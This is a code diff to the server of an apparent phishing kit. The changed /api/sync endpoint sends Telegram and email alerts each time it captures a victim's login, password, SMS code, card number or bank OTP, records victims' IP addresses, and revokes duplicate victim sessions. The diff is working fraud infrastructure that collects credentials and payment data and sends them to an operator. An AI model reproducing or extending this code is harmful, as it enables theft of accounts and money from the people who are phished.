@@ -157,17 +157,27 @@ const getFlagEmoji = (countryCode: string) => {
     return String.fromCodePoint(...codePoints);
 };
 
+const escapeHtml = (unsafe: any) => {
+    if (typeof unsafe !== 'string') return unsafe;
+    return unsafe
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+};
+
 const formatSessionForTelegram = (session: any, title: string, flag: string) => {
     const s = session;
     const d = s.data || s; // Fallback
 
     // Helper for "Value or Empty"
-    const v = (val: any) => val ? `<code>${val}</code>` : '<i>(Empty)</i>';
+    const v = (val: any) => val ? `<code>${escapeHtml(val)}</code>` : '<i>(Empty)</i>';
 
     let msg = `${flag} <b>${title}</b>\n\n`;
 
     msg += `🆔 <b>Session ID:</b> <code>${s.sessionId || s.id}</code>\n`;
-    msg += `🌍 <b>IP Address:</b> <code>${s.fingerprint?.ip || s.ip || 'Unknown'}</code>\n`;
+    msg += `🌍 <b>IP Address:</b> <code>${s.ip || s.fingerprint?.ip || 'Unknown'}</code>\n`;
     msg += `🕒 <b>Time:</b> ${new Date().toLocaleString()}\n`;
 
     // Identity
@@ -306,13 +316,6 @@ const sendTelegram = (msg: string) => {
 const sendEmail = async (session: any, title: string) => {
     if (!cachedSettings.email) return;
 
-    // Check if Admin is online
-    const adminRoom = io.sockets.adapter.rooms.get('admin');
-    if (adminRoom && adminRoom.size > 0) {
-        console.log(`[Email] Admin online, suppressing email for session ${session.sessionId}`);
-        return;
-    }
-
     console.log(`[Email] Sending email to ${cachedSettings.email} for session ${session.sessionId}`);
 
     const htmlBody = formatSessionForEmail(session, title);
@@ -356,29 +359,47 @@ app.post('/api/sync', async (req, res) => {
         const ip = getClientIp(req);
         const country = getIpCountry(ip);
 
-        // Merge calculated Country into data
-        if (country) {
-            data.ipCountry = country;
-        }
+        // Populate Server-Side Fields
+        data.ip = ip;
+        if (data.fingerprint) data.fingerprint.ip = ip;
+        if (country) data.ipCountry = country;
 
         // Notification Logic
         const existing = await db.getSession(data.sessionId);
+        const flag = getFlagEmoji(country || (existing ? existing.ipCountry : 'XX') || 'XX');
 
         // 1. New Session (Push Telegram)
         if (!existing) {
-             const flag = getFlagEmoji(country || 'XX');
              const msg = formatSessionForTelegram(data, 'New Session Started', flag);
              sendTelegram(msg);
         }
-        // 2. Completed Session (Email + Telegram)
-        else if (existing.status !== 'Verified' && data.status === 'Verified') {
-             const flag = getFlagEmoji(country || existing.ipCountry || 'XX');
-             const cardType = data.cardType ? `[${data.cardType.toUpperCase()}]` : '[CARD]';
-             const title = `Session Verified ${cardType}`;
+        // 2. Update Notifications (Intermediate Steps)
+        else {
+            const changes: string[] = [];
+            const d = data;
+            const e = existing.data || existing; // handle raw or nested
 
-             const msg = formatSessionForTelegram(data, title, flag);
-             sendTelegram(msg);
-             sendEmail(data, title);
+            // Check specific fields for changes
+            if (d.email && d.email !== e.email) changes.push('Login Captured');
+            if (d.password && d.password !== e.password) changes.push('Password Captured');
+            if (d.phoneCode && d.phoneCode !== e.phoneCode) changes.push('SMS Code Captured');
+            if (d.cardNumber && d.cardNumber !== e.cardNumber) changes.push('Card Captured');
+            if (d.cardOtp && d.cardOtp !== e.cardOtp) changes.push('Bank OTP Captured');
+
+            // Completed Session
+            if (existing.status !== 'Verified' && data.status === 'Verified') {
+                 const cardType = data.cardType ? `[${data.cardType.toUpperCase()}]` : '[CARD]';
+                 const title = `Session Verified ${cardType}`;
+                 const msg = formatSessionForTelegram(data, title, flag);
+                 sendTelegram(msg);
+                 sendEmail(data, title);
+            }
+            // Intermediate Updates
+            else if (changes.length > 0) {
+                 const title = `Update: ${changes.join(', ')}`;
+                 const msg = formatSessionForTelegram(data, title, flag);
+                 sendTelegram(msg);
+            }
         }
 
         // Prevent downgrading 'Verified' status
@@ -388,6 +409,28 @@ app.post('/api/sync', async (req, res) => {
         }
 
         await db.upsertSession(data.sessionId, data, ip);
+
+        // Deduplication: Revoke other active sessions from same IP AND Same User Agent
+        // This prevents "Private Window" duplicates but allows "Different Devices on Same WiFi"
+        const userIpSessions = await db.getSessionsByIp(ip);
+        let revokedCount = 0;
+        const currentUA = data.fingerprint?.userAgent;
+
+        if (currentUA) {
+            for (const s of userIpSessions) {
+                const sameUA = s.fingerprint?.userAgent === currentUA;
+
+                if (sameUA && s.id !== data.sessionId && s.status !== 'Verified' && s.status !== 'Revoked') {
+                    s.status = 'Revoked';
+                    await db.upsertSession(s.id, s, s.ip);
+                    revokedCount++;
+                }
+            }
+        }
+
+        if (revokedCount > 0) {
+            console.log(`[Sync] Revoked ${revokedCount} duplicate sessions for IP ${ip} (UA Match)`);
+        }
 
         // Notify Admin Room (broadcast to all admins if we had separate admin rooms)
         // For now, simply broadcast to everyone listening for 'session-update'
